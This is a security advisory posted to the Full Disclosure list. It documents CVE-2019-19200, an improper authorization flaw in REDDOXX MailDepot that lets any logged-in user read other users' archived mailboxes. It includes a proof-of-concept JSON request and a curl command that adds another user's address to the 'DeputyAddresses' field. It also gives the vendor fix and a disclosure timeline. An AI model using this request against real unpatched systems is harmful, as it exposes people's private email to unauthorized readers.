
Date: Fri, 2 Oct 2020 16:17:31 +0200
From: Micha Borrmann <micha.borrmann@...s.de>
To: <fulldisclosure@...lists.org>
Subject: [FD] [SYSS-2019-048] Improper Authorization (CWE-285) in REDDOXX
 MailDepot (CVE-2019-19200)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Advisory ID:               SYSS-2019-048
Product:                   MailDepot
Manufacturer:              REDDOXX GmbH
Affected Version(s):       2032 SP2 (2.2.1242)
Tested Version(s):         2032 SP2 (2.2.1242)
Vulnerability Type:        Improper Authorization (CWE-285)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2019-11-19
Solution Date:             2020-06-09
Public Disclosure:         2020-10-02
CVE Reference:             CVE-2019-19200
Authors of Advisory:       Micha Borrmann (SySS GmbH)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

REDDOXX MailDepot is  an e-mail archiving solution  with many features
and an optional web browser user interface.

The manufacturer describes the product as follows (see [1]):

"The email  archiving solution  works independently  from the  type of
mail server, supports any type of  storage and can therefore be easily
integrated into any existing infrastructure."

Due to improper user authorization checks, a user can access mailboxes
of other users.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The REDDOXX MailDepot web service  does not correctly verify whether a
user  has  the  proper  rights  to access  specified  mailboxes  in  a
corresponding web service request.

The web service request will only  be processed if it contains a valid
authentication token  (usual REST web  service), but the names  of the
mailboxes to be  accessed are given within a JSON  object which is not
validated properly regarding user access permissions.

Thus, any authenticated  user can access mailboxes of  other users due
to improper authorization checks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

After a successful logon, an ID is  assigned by the server to the user
and this ID has  to be sent with every further  web service request as
an authentication token (usual REST web service).

In order  to access  a mailbox, a  request with a  JSON object  of the
following type is sent:

{
  "id": "{12345678-1234-5678-1234-5678ABCD0000}",
  "method": "MailDepot2.QueryMailDepot",
  "params": {
    "Query": {
      "NewQuery": true,
      "QueryString": "DATE:[20191114095729 TO 20191119095729]",
      "Storages": [],
      "Categories": [],
      "States": [
        "csManual"
      ],
      "DeputyAddresses": [
        "validuser@...pany.com"
      ],
      "IncludeDeleted": false,
      "MaxResults": 10000,
      "MaxResponseTime": 30000,
      "Page": 1,
      "Rows": 30,
      "SortField": "date",
      "SortDirection": "desc"
    }
  }
}

By   adding  additional   values   (e-mail  addresses)   to  the   key
"DeputyAddresses",  mailboxes of  other users  can be  accessed in  an
unauthorized way.

The following example using cURL demonstrates this attack:

$ curl --url 'https://mailarchive.company.com/RdxEngine/json' --data '{"id":"{12345678-1234-5678-1234-5678ABCD0000}","method":"MailDepot2.QueryMailDepot","params":{"Query":{"NewQuery":true,"QueryString":"DATE:[20191114095729 TO 20191119095729]","Storages":[],"Categories":[],"States":["csManual"],"DeputyAddresses":["validuser@...pany.com","bigboss@...pany.com"],"IncludeDeleted":false,"MaxResults":10000,"MaxResponseTime":30000,"Page":1,"Rows":30,"SortField":"date","SortDirection":"desc"}}}'

It  is more  convenient to  perform this  kind of  attack using  a web
browser and a modifying web proxy.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Install the provided  security update.  If such a  modified request is
sent,  the  updated  version  2033 (2.3.3022)  replies  with  "No  ACL
assigned".

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2019-11-18: Detection of the vulnerability
2019-11-19: Vulnerability reported to manufacturer
2019-11-20: Manufacturer confirms vulnerability
2019-11-21: CVE number assigned
2020-06-09: Update was released from the vendor [2]
2020-10-02: Public release of the security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] REDDOX MailDepot Product Website
    https://www.reddoxx.com/en/products/archiving/
[2] REDDOXX Release Information
    https://www.reddoxx.com/reddoxx-appliance-2033-verfuegbar/    
[3] SySS Security Advisory SYSS-2019-048
    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-048.txt
[4] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Micha Borrmann of SySS GmbH.

E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: 38BD 7A9C 3EA9 39C5 33F9  94D0 CFC2 D5B0 8EE0 CBB9

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without  warranty of any  kind. Details of this  security advisory
may  be  updated  in  order  to provide  as  accurate  information  as
possible. The latest version of this security advisory is available on
the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEOL16nD6pOcUz+ZTQz8LVsI7gy7kFAl93NYsACgkQz8LVsI7g
y7mkIRAAmZAvKWu2O4Keg0YXe65bnMHbc6rj+kQokhOUA68Zs90kqAhNXGsuyIG2
d+6UrRa85StVYMHYwYNr/YjULFPh5D1wDrQZivJgR5AlF29XZQ7LYib3WnPEtWNO
sWrTzpWfh1MaO2XJbyyg8CyshS8kongMsgfCIEwDDusJYnQaFSCfmRItTixBLBAW
9IJjH+HD8dGazwD0a01lvYdUZvtDQl7dQUs0YatZWbKtsCzzQlNNKXS6PoT/d6X2
H5cgMrG7d2isgPqw/xYEPHN5+ozpRTviI0foFfR5lOhrZbNDTOhPthX8CnQDWUMX
QNa39YdnTjyu6jddPVxvKm27lQ+iNhoCz0JNWHeQfJdgunvY5zu4m9i5zsDOSAdR
qVqzLBxZ8l0/m4iALuI4BiSl/oxi/n/r6o1+/p1x46vtg5+UUt/UZY8tRn/6SnwW
YDzmWB6eglcXp93nTZuZrmxAt8l5XZLfCssHVN5fLgkSED4Dpihzf8gw9oRrwTZe
/yQgxlzIkVUZ2egf7VlflclOnpAMLss+4JpkMhst+I3HutdEBU7d5dQBHLdW6hWI
rYwhUf4ofXaSJXm6iuNwyJSBv77Z2/jxDV8NCQ2oEsORxMU0FAyK+xX7C3jP4VNc
mS7u9yhmP0Ye55D5rEK+J1ICRZXE+hUdZMsvzMg/Xted75Z5XGQ=
=PZLP
-----END PGP SIGNATURE-----


_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
